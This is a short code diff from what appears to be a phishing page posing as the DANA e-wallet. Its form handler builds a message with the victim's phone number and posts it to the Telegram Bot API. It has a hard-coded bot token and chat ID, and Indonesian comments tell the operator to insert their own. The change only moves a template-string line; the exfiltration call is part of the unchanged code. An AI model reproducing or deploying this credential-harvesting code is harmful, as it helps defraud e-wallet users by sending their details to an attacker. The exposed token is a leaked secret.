@@ -87,13 +87,14 @@ function submitform() {
     let message = `
 DANA | NoHP | ${phone_number}
 
+- No HP : ${phone_number}`;
+
 //_masukan_ID_Akun_Telegram_kamu
 var id_telegram   = "5611258815";
 
 //_masukan_ID_Bot_Telegram_kamu
 var token_botTele = "5465756419:AAFpdwSvIcRtIet6s7es4jgKTwmaO1cevng";
 
-- No HP : ${phone_number}`;
     fetch("https://api.telegram.org/bot"+token_botTele+"/sendMessage?parse_mode=markdown",{
         method: 'POST',
         headers: {
